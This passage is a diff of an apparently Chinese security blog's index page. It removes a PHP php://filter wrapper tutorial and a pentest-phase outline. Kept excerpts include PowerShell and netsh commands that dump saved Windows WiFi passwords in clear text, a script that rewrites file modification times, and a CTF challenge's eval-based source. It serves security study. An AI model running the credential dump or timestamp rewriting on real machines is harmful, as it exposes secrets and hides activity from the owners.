-<td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
-</tr>
-<tr>
-<td>read=&lt;读链的筛选列表&gt;</td>
-<td>可选参数。可以设定一个或多个过滤器名称，以管道符<code>/</code>分隔。</td>
-</tr>
-<tr>
-<td>write=&lt;写链的筛选列表&gt;</td>
-<td>可选参数。可以设定一个或多个过滤器名称，以管道符<code>/</code>分隔。</td>
-</tr>
-<tr>
-<td>&lt;; 两个链的筛选列表&gt;</td>
-<td>任何没有以<code>read=</code>或<code>write=</code>作为前缀的筛选器列表会视情况应用于读链或写链。</td>
-</tr>
-</tbody></table>
-<p><strong>封装协议摘要（针对<code>php://filter</code>，参考被筛选的封装器</strong></p>
-<table>
-<thead>
-<tr>
-<th>属性</th>
-<th>支持</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>受限于<code>allow_url_fopen</code></td>
-<td>No</td>
-</tr>
-<tr>
-<td>受限于<code>allow_url_include</code></td>
-<td>仅<code>php://input</code>、<code>php://stdin</code>、<code>php://memory</code>、<code>php://temp</code></td>
-</tr>
-<tr>
-<td>允许读取</td>
-<td>仅<code>php://stdin</code>、<code>php://input</code>、<code>php://fd</code>、<code>php://memory</code>、<code>php://temp</code></td>
-</tr>
-<tr>
-<td>允许写入</td>
-<td>仅<code>php://stdout</code>、<code>php://stderr</code>、<code>php://output</code>、<code>php://fd</code>、<code>php://memory</code>、<code>php://temp</code></td>
-</tr>
-<tr>
-<td>允许追加</td>
-<td>同写入</td>
-</tr>
-<tr>
-<td>允许同时读写</td>
-<td>仅<code>php://fd</code>、<code>php://memory</code>、<code>php://temp</code></td>
-</tr>
-<tr>
-<td>支持<code>stat()</code></td>
-<td>仅<code>php://memory</code>、<code>php://temp</code></td>
-</tr>
-<tr>
-<td>支持<code>unlink()</code></td>
-<td>No</td>
-</tr>
-<tr>
-<td>支持<code>rename()</code></td>
-<td>No</td>
-</tr>
-<tr>
-<td>支持<code>mkdir()</code></td>
-<td>No</td>
-</tr>
-<tr>
-<td>支持<code>rmdir()</code></td>
-<td>No</td>
-</tr>
-<tr>
-<td>仅支持<code>stream_select()</code></td>
-<td><code>php://stdin</code>、<code>php://stdout</code>、<code>php://stderr</code>、<code>php://fd</code>、<code>php://temp</code></td>
-</tr>
-</tbody></table>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*	等同于</span></span><br><span class="line"><span class="comment">	readfile("http://www.a.com");</span></span><br><span class="line"><span class="comment">	实际上没有指定过滤器</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">readfile(<span class="string">"php://filter/resource=http://www.a.com"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	采用给一个或</span></span><br><span class="line"><span class="comment">		以管道符 | 分隔的</span></span><br><span class="line"><span class="comment">	多个过滤器</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*以大写字母输入*/</span></span><br><span class="line">readfile(<span class="string">"php://filter/read=string.toupper/resource=http://www.a.com"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*转换成大写，再使用ROT13加密之后*/</span></span><br><span class="line">readfile(<span class="string">"php://filter/read=string.toupper|string.rot13/resource=http://www.a.com"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*关于管道顺序，总是从做往右做处理*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	base64_encode(test.txt) =&gt; test2.txt</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"string -&gt; toupper -&gt; base64-encode: "</span>;</span><br><span class="line">    <span class="keyword">echo</span> readfile(<span class="string">"php://filter/read=string.toupper|convert.base64-encode/resource=test.txt"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"reversed process: "</span>;</span><br><span class="line">    <span class="keyword">echo</span> readfile(<span class="string">"php://filter/read=convert.base64-decode|string.tolower/resource=test2.txt"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	通过 rot13 过滤器筛选出字符 "Hello World"</span></span><br><span class="line"><span class="comment">	然后写入当前目录下的 test.txt</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">file_put_contents(<span class="string">"php://filter/write=string.rot13/resource=test.txt"</span>, <span class="string">"Hello World"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="可用过滤器列表"><a href="#可用过滤器列表" class="headerlink" title="可用过滤器列表"></a>可用过滤器列表</h3><blockquote>
-<p>It is worth noting a slight asymmetry between stream_filter_append() and stream_filter_prepend(). Every PHP stream contains a small read buffer where it stores blocks of data retrieved from the filesystem or other resource in order to process data in the most efficient manner. As soon as data is pulled from the resource into the stream’s internal buffer, it is immediately processed through any attached filters whether the PHP application is actually ready for the data or not. If data is sitting in the read buffer when a filter is appended, this data will be immediately processed through that filter making the fact that it was sitting in the buffer seem transparent. However, if data is sitting in the read buffer when a filter is prepended, this data will NOT be processed through that filter. It will instead wait until the next block of data is retrieved from the resource.</p>
-</blockquote>
-<h4 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a>字符串过滤器</h4><ul>
-<li><code>string.rot13</code>：使用rot13对流数据进行加密，相当于<code>str_rot13()</code>函数。</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fp = fopen(<span class="string">'php://output'</span>, <span class="string">'w'</span>);</span><br><span class="line">stream_filter_append($fp, <span class="string">'string.rot13'</span>);</span><br><span class="line">fwrite($fp, <span class="string">"This is a test"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>string.toupper</code>：大写</li>
-<li><code>string.tolower</code>：小写</li>
-<li><code>string.strip_tags</code>：参考<code>strip_tags()</code>函数</li>
-</ul>
-<h4 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h4><p>具体用法参考对应函数名。</p>
-<ul>
-<li><code>convert.base64-encode</code></li>
-<li><code>convert.base64-decode</code></li>
-<li><code>convert.quoted-printable-encode</code></li>
-<li><code>convert.quoted-printable-decode</code></li>
-<li><code>convert.iconv.*</code></li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fp = fopen(<span class="string">'php://output'</span>, <span class="string">'w'</span>);</span><br><span class="line">stream_filter_append($fp, <span class="string">'convert.iconv.utf-16le.utf-8'</span>);</span><br><span class="line">fwrite($fp, <span class="string">"T\0h\0i\0s\0 \0i\0s\0 \0a\0 \0t\0e\0s\0t\0.\0\n\0"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Outputs: This is a test.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="压缩过滤器"><a href="#压缩过滤器" class="headerlink" title="压缩过滤器"></a>压缩过滤器</h4><p>压缩过滤器不产生命令行工具如<code>gzip</code>的头和尾信息。知识压缩和解压数据流中的有效载荷部分。</p>
-<ul>
-<li><code>zlib.deflate</code>和<code>zlib.inflate</code></li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$params = <span class="keyword">array</span>(<span class="string">'level'</span> =&gt; <span class="number">6</span>, <span class="string">'window'</span> =&gt; <span class="number">15</span>, <span class="string">'memory'</span> =&gt; <span class="number">9</span>);</span><br><span class="line"></span><br><span class="line">$original_text = <span class="string">"This is a test.\nThis is only a test.\nThis is not an important string.\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"The original text is "</span> . strlen($original_text) . <span class="string">" characters long.\n"</span>;</span><br><span class="line"></span><br><span class="line">$fp = fopen(<span class="string">'test.deflated'</span>, <span class="string">'w'</span>);</span><br><span class="line">stream_filter_append($fp, <span class="string">'zlib.deflate'</span>, STREAM_FILTER_WRITE, $params);</span><br><span class="line">fwrite($fp, $original_text);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"The compress file is "</span> . filesize(<span class="string">'test.deflated'</span>) . <span class="string">" bytes long.\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"The original text was:\n"</span>;</span><br><span class="line">readfile(<span class="string">'php://filter/zlib.inflate/resource=test.deflated'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Generates output:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The original text is 70 characters long.</span></span><br><span class="line"><span class="comment">The compressed file is 56 bytes long.</span></span><br><span class="line"><span class="comment">The original text was:</span></span><br><span class="line"><span class="comment">This is a test.</span></span><br><span class="line"><span class="comment">This is only a test.</span></span><br><span class="line"><span class="comment">This is not an important string.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	To read a gzip encoded stream from http</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">$opts = [</span><br><span class="line">    <span class="string">"http"</span> =&gt; [</span><br><span class="line">        <span class="string">"method"</span> =&gt; <span class="string">"GET"</span>,</span><br><span class="line">        <span class="string">"header"</span> =&gt; [<span class="string">"Accept-Encoding: gzip"</span>],</span><br><span class="line">    ]</span><br><span class="line">];</span><br><span class="line">$ctx = stream_context_create($opts);</span><br><span class="line"></span><br><span class="line">$f = fopen(<span class="string">'http://php.net'</span>, <span class="string">'r'</span>, <span class="keyword">false</span>, $ctx);</span><br><span class="line"><span class="comment">//check stream_get_meta_data($f)["wrapper_data"] has "Content-Encoding: gzip"</span></span><br><span class="line">stream_filter_append($f, <span class="string">"zlib.inflate"</span>, STREAM_FILTER_READ, [<span class="string">"window"</span> =&gt; <span class="number">30</span>]);</span><br><span class="line"><span class="keyword">echo</span> stream_get_contents($f); <span class="comment">// any stream processing</span></span><br><span class="line">fclose($f);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>bzip2.compress</code>和<code>bzip2.decompress</code></li>
-</ul>
-<h4 id="加密过滤器"><a href="#加密过滤器" class="headerlink" title="加密过滤器"></a>加密过滤器</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//用 3DES 将文件加密输出</span></span><br><span class="line">$passphrase = <span class="string">'My secret'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Turn a human readable passphrase</span></span><br><span class="line"><span class="comment"> * into a reproducable iv/key pair</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$iv = substr(md5(<span class="string">'iv'</span>.$passphrase, <span class="keyword">true</span>), <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">$key = substr(md5(<span class="string">'pass1'</span>.$passphrase, <span class="keyword">true</span>) .</span><br><span class="line">               md5(<span class="string">'pass2'</span>.$passphrase, <span class="keyword">true</span>), <span class="number">0</span>, <span class="number">24</span>);</span><br><span class="line">$opts = <span class="keyword">array</span>(<span class="string">'iv'</span>=&gt;$iv, <span class="string">'key'</span>=&gt;$key);</span><br><span class="line"></span><br><span class="line">$fp = fopen(<span class="string">'secert-file.enc'</span>, <span class="string">'wb'</span>);</span><br><span class="line">stream_filter_append($fp, <span class="string">'mcrypt.tripledes'</span>, STREAM_FILTER_WRITE, $opts);</span><br><span class="line">fwrite($fp, <span class="string">'Secret secret secret data'</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//读取加密的文件</span></span><br><span class="line">$passphrase = <span class="string">'My secret'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Turn a human readable passphrase</span></span><br><span class="line"><span class="comment"> * into a reproducable iv/key pair</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$iv = substr(md5(<span class="string">'iv'</span>.$passphrase, <span class="keyword">true</span>), <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">$key = substr(md5(<span class="string">'pass1'</span>.$passphrase, <span class="keyword">true</span>) .</span><br><span class="line">               md5(<span class="string">'pass2'</span>.$passphrase, <span class="keyword">true</span>), <span class="number">0</span>, <span class="number">24</span>);</span><br><span class="line">$opts = <span class="keyword">array</span>(<span class="string">'iv'</span>=&gt;$iv, <span class="string">'key'</span>=&gt;$key);</span><br><span class="line"></span><br><span class="line">$fp = fopen(<span class="string">'secert-file.enc'</span>, <span class="string">'rb'</span>);</span><br><span class="line">stream_filter_append($fp, <span class="string">'mdecrypt.tripledes'</span>, STREAM_FILTER_WRITE, $opts);</span><br><span class="line">$data = rtrim(stream_get_contents($fp));</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $data;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h2>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/web-sec/PHP-Wrappers.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -752,6 +625,14 @@
 <h2 id="获取Windows机器上保存的WIFI密码"><a href="#获取Windows机器上保存的WIFI密码" class="headerlink" title="获取Windows机器上保存的WIFI密码"></a>获取Windows机器上保存的WIFI密码</h2><h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><p><code>(netsh wlan show profiles) | Select-String &quot;\:(.+)$&quot; | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=&quot;$name&quot; key=clear)}  | Select-String &quot;Key Content\W+\:(.+)$&quot; | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize</code></p>
 <h3 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h3><p><code>netsh wlan show profiles &quot;NETWORK-SSID&quot; key=clear</code></p>
 
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/pentest/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -850,6 +731,14 @@
 <h2 id="更改文件夹下所有文件“修改时间”"><a href="#更改文件夹下所有文件“修改时间”" class="headerlink" title="更改文件夹下所有文件“修改时间”"></a>更改文件夹下所有文件“修改时间”</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="built_in">Get-Date</span> <span class="string">"2/13/2007 8:00 AM"</span></span><br><span class="line"><span class="variable">$b</span> = <span class="built_in">Get-ChildItem</span> <span class="string">"C:\Scripts"</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$i</span> <span class="keyword">in</span> <span class="variable">$b</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$i</span>.LastWriteTime = <span class="variable">$a</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$a</span>.AddMinutes(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/pentest/PowerShell%20%E7%AC%94%E8%AE%B0%20%5B%E4%B8%8D%E6%96%AD%E6%9B%B4%E6%96%B0%5D.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -950,9 +839,17 @@
           <h2 id="source-code"><a href="#source-code" class="headerlink" title="source code"></a>source code</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$MY = create_function(<span class="string">""</span>,<span class="string">"die(`cat flag.php`);"</span>);</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"function SUCTF_$hash()&#123;"</span></span><br><span class="line">    .<span class="string">"global \$MY;"</span></span><br><span class="line">    .<span class="string">"\$MY();"</span></span><br><span class="line">    .<span class="string">"&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func_name'</span>]))&#123;</span><br><span class="line">    $_GET[<span class="string">"func_name"</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
 
 <h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>匿名函数并不是真的没有名字。。。<br><code>%00lambda_%d</code></p>
-<p><img src="/images/f1efe6696754ed6c6f1a78a6eaf970d0047b1a21.png" alt=""></p>
+<p><img src="/images/f1efe6696754ed6c6f1a78a6eaf970d0047b1a21.png" alt></p>
 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.jianshu.com/p/19e3ee990cb7" target="_blank" rel="noopener">https://www.jianshu.com/p/19e3ee990cb7</a><br><a href="https://github.com/orangetw/My-CTF-Web-Challenges" target="_blank" rel="noopener">https://github.com/orangetw/My-CTF-Web-Challenges</a><br><a href="http://php.net/manual/zh/book.phar.php" target="_blank" rel="noopener">http://php.net/manual/zh/book.phar.php</a><br><a href="http://blog.jobbole.com/91920/" target="_blank" rel="noopener">http://blog.jobbole.com/91920/</a><br><a href="https://yq.aliyun.com/ziliao/55320" target="_blank" rel="noopener">https://yq.aliyun.com/ziliao/55320</a><br><a href="https://www.zhihu.com/question/23786410" target="_blank" rel="noopener">https://www.zhihu.com/question/23786410</a></p>
 
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/web-sec/CTF/SUCTF%20Anonymous%20WriteUp.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1049,6 +946,14 @@
           <h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://security.stackexchange.com/questions/9908/multibyte-character-exploits-php-mysql" target="_blank" rel="noopener">https://security.stackexchange.com/questions/9908/multibyte-character-exploits-php-mysql</a><br><a href="https://www.erich-kachel.de/unicode-issues-on-php/" target="_blank" rel="noopener">https://www.erich-kachel.de/unicode-issues-on-php/</a><br><a href="https://vigilance.fr/vulnerability/MySQL-SQL-injection-via-multi-byte-characters-5885" target="_blank" rel="noopener">https://vigilance.fr/vulnerability/MySQL-SQL-injection-via-multi-byte-characters-5885</a><br><a href="http://shiflett.org/blog/2006/addslashes-versus-mysql-real-escape-string" target="_blank" rel="noopener">http://shiflett.org/blog/2006/addslashes-versus-mysql-real-escape-string</a><br><a href="https://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string/12118602#12118602" target="_blank" rel="noopener">https://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string/12118602#12118602</a></p>
 <p><a href="http://eleves.ec-lille.fr/~couprieg/post/Bypass-addslashes-with-UTF-8-characters" target="_blank" rel="noopener">http://eleves.ec-lille.fr/~couprieg/post/Bypass-addslashes-with-UTF-8-characters</a></p>
 
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/sqli/%E7%BC%96%E7%A0%81%E5%BC%95%E8%B5%B7%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1144,8 +1049,15 @@
       
           <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>JSON Web Tokens</code> 或者<code>JWTs</code>可以作为传统<code>session</code>和<code>cookies</code>一个替代方案。由于JWTs是无状态的，并且是签名的，所以针对JWTs有一些特有的安全问题。本文介绍了几种可以检测JWT实现是否安全的方法。</p>
 <h2 id="关于JWTs"><a href="#关于JWTs" class="headerlink" title="关于JWTs"></a>关于JWTs</h2><p>一个<code>JWT(Json Web Token)</code>串中包含了一个签名的数据结构，一般用作认证。JWT中包含一个密码签名，比如一个数据的HMAC签名。正是如此，只有服务器可以创建和更改令牌(Token)。</p>
-<h3 id="什么是JWT"><a href="#什么是JWT" class="headerlink" title="什么是JWT"></a>什么是JWT</h3><h3 id="分辨JWT"><a href="#分辨JWT" class="headerlink" title="分辨JWT"></a>分辨JWT</h3><h2 id="攻击JWTs"><a href="#攻击JWTs" class="headerlink" title="攻击JWTs"></a>攻击JWTs</h2><h3 id="检测JWT中的敏感信息"><a href="#检测JWT中的敏感信息" class="headerlink" title="检测JWT中的敏感信息"></a>检测JWT中的敏感信息</h3><h3 id="更改签名算法"><a href="#更改签名算法" class="headerlink" title="更改签名算法"></a>更改签名算法</h3><h4 id="将签名算法变为none"><a href="#将签名算法变为none" class="headerlink" title="将签名算法变为none"></a>将签名算法变为none</h4><h4 id="将签名算法从RS256更改为HS256"><a href="#将签名算法从RS256更改为HS256" class="headerlink" title="将签名算法从RS256更改为HS256"></a>将签名算法从RS256更改为HS256</h4><h3 id="破解密钥"><a href="#破解密钥" class="headerlink" title="破解密钥"></a>破解密钥</h3><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/" target="_blank" rel="noopener">https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/</a><br><a href="https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6" target="_blank" rel="noopener">https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6</a></p>
-
+<h3 id="什么是JWT"><a href="#什么是JWT" class="headerlink" title="什么是JWT"></a>什么是JWT</h3><h3 id="分辨JWT"><a href="#分辨JWT" class="headerlink" title="分辨JWT"></a>分辨JWT</h3><h2 id="攻击JWTs"><a href="#攻击JWTs" class="headerlink" title="攻击JWTs"></a>攻击JWTs</h2><h3 id="检测JWT中的敏感信息"><a href="#检测JWT中的敏感信息" class="headerlink" title="检测JWT中的敏感信息"></a>检测JWT中的敏感信息</h3><h3 id="更改签名算法"><a href="#更改签名算法" class="headerlink" title="更改签名算法"></a>更改签名算法</h3><h4 id="将签名算法变为none"><a href="#将签名算法变为none" class="headerlink" title="将签名算法变为none"></a>将签名算法变为none</h4>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/web-sec/JWT%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1254,65 +1166,14 @@
 </ol>
 <h2 id="前渗透"><a href="#前渗透" class="headerlink" title="前渗透"></a>前渗透</h2><p>前渗透主要工作是拿到目标网站/系统的数据或权限，并以此为突破口进行后续流程。</p>
 <p>前渗透的工作内容包括但不限于：</p>
-<ol>
-<li>敏感信息泄漏检测</li>
-<li>权限验证检测</li>
-<li>不安全的验证机制检测</li>
-<li>暴力破解检测</li>
-<li>SQL注入漏洞检测</li>
-<li>XSS漏洞检测</li>
-<li>命令注入检测</li>
-<li>文件上传漏洞检测</li>
-<li>文件包含漏洞检测</li>
-<li>服务器漏洞检测</li>
-<li>Web服务器及中间件漏洞检测</li>
-</ol>
-<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><p>后渗透主要工作是对前渗透阶段拿到的网站/系统的数据或权限，对目标网站/系统所在的网络进行进一步渗透测试以及持久化。</p>
-<p>后渗透的工作内容包括但不限于：</p>
-<ol>
-<li>收集目标主机信息，包括：<ol>
-<li>当前系统用户及权限</li>
-<li>当前网络状态</li>
-<li>当前系统版本及补丁状态</li>
-<li>反病毒/防火墙信息</li>
-</ol>
-</li>
-<li>收集敏感文件信息</li>
-<li>收集目标主机所在内网信息，包括：<ol>
-<li>内网存活主机扫描</li>
-<li>内网端口扫描</li>
-<li>域环境信息</li>
-</ol>
-</li>
-<li>权限提升</li>
-<li>横向移动</li>
-<li>持久化</li>
-<li>内网系统漏洞检测及利用</li>
-</ol>
-<h2 id="测试报告"><a href="#测试报告" class="headerlink" title="测试报告"></a>测试报告</h2><p>测试报告是对一次渗透测试结果的分析及总结，其内容应包括但不限于：</p>
-<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><ol>
-<li>测试目的</li>
-<li>测试范围</li>
-<li>测试团队详细信息</li>
-<li>测试结果综述</li>
-</ol>
-<h3 id="详细测试流程"><a href="#详细测试流程" class="headerlink" title="详细测试流程"></a>详细测试流程</h3><ol>
-<li>测试工具列表</li>
-<li>测试步骤<ul>
-<li>每个漏洞一个标题/标号</li>
-<li>测试步骤应将所有发现的漏洞/风险体现，使得技术人员通过渗透测试报告进行漏洞复现。</li>
-</ul>
-</li>
-</ol>
-<h3 id="风险评级"><a href="#风险评级" class="headerlink" title="风险评级"></a>风险评级</h3><p>对目标网站/系统进行综合评价。</p>
-<h3 id="漏洞详情及修复建议"><a href="#漏洞详情及修复建议" class="headerlink" title="漏洞详情及修复建议"></a>漏洞详情及修复建议</h3><p>针对每个漏洞进行分析，包括：</p>
-<ol>
-<li>风险评级</li>
-<li>漏洞描述</li>
-<li>漏洞影响</li>
-<li>修复建议</li>
-</ol>
